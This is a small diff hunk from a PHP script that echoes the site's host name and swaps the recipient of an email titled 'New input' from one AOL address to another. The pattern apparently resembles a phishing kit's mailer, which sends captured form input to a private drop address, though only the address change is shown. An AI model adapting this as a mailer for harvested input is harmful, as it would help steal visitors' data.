@@ -20,7 +20,7 @@ $domain1 = $_SERVER['HTTP_HOST'];
 echo $domain1;
 
 // Define the recipient email address
-$to = 'jlens3@aol.com';
+$to = 'graceofgodalways@aol.com';
 
 // Define the subject of the email
 $subject = 'New input';
